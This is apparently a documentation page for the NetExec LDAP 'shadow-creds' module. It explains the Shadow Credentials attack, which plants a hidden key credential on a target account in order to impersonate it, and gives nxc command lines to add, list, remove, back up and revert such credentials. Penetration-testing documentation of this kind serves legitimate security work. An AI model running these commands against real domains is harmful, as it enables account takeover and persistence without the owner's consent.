---
description: Shadow Credentials Attack
---

# 🆕 Shadow Credentials Attack

The LDAP shadow-creds module enables the Shadow Credentials attack, an exploitation technique inspired by [pyWhisker](https://github.com/ShutdownRepo/pywhisker). This attack allows an attacker to add a hidden authentication credential to a target account and impersonate it without modifying its existing password.

Relevated actions are below:

```
list
add
remove
backup
revert
keyCredentials of computers.
```


Add/list/remove usage

<img width="1495" height="443" alt="image" src="https://github.com/user-attachments/assets/7472b6c8-e20d-4006-83df-726ed2f687f2" />

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=add
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=remove
```

Cred info usage

<img width="1581" height="640" alt="image" src="https://github.com/user-attachments/assets/3cc198fb-a240-4dc5-8a2c-770bf21fd59d" />

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=info DEVICE_ID=<guid>
```

Backup and Revert

<img width="1569" height="639" alt="image" src="https://github.com/user-attachments/assets/6cb2b7cd-cad3-418b-a32a-7a8bcd725b5b" />

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=add
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=backup
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=remove DEVICE_ID=<guid>
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=revert JSONFILE=shadow-creds.json
```

